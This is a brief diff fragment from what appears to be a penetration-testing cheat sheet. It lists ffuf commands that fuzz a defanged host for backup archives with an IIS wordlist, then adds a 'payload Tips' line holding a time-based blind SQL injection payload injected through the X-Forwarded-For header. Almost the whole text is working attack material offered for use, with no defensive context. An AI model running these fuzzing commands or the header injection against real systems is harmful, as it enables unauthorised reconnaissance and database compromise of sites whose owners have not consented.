@@ -15,3 +15,11 @@ ffuf -w /iis.txt -u x.a[.]com/xFUZZ -e zip,7z,gz
 ffuf -w /iis.txt -u x.a[.]com/xFUZZ -e zip,7z,gz
 ffuf -w /iis.txt -u x.a[.]com/x.aFUZZ -e zip,7z,gz
 ~/_ fuzz ]
+
+
+
+
+
+
+payload Tips :
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(8),0))XOR'
